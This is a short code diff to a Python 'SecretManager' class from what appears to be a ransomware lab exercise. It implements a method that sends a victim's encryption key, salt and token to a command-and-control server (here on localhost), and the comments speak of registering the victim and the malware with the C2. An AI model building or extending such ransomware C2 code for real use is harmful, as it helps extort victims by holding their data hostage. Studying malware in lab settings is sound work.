@@ -48,9 +48,13 @@ class SecretManager:
         return str(tmp, "utf8")
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
-        # register the victim to the CNC
-        raise NotImplemented()
-
+        #Use the post function using the URL of the CNC and the json data
+        response = requests.post('https://127.0.0.1:6666/new', json={
+            "token": self.bin_to_b64(token),
+            "salt": self.bin_to_b64(salt),
+            "key": self.bin_to_b64(key)
+        })
+        
     def setup(self)->None:
         # main function to create crypto data and register malware to cnc
         raise NotImplemented()
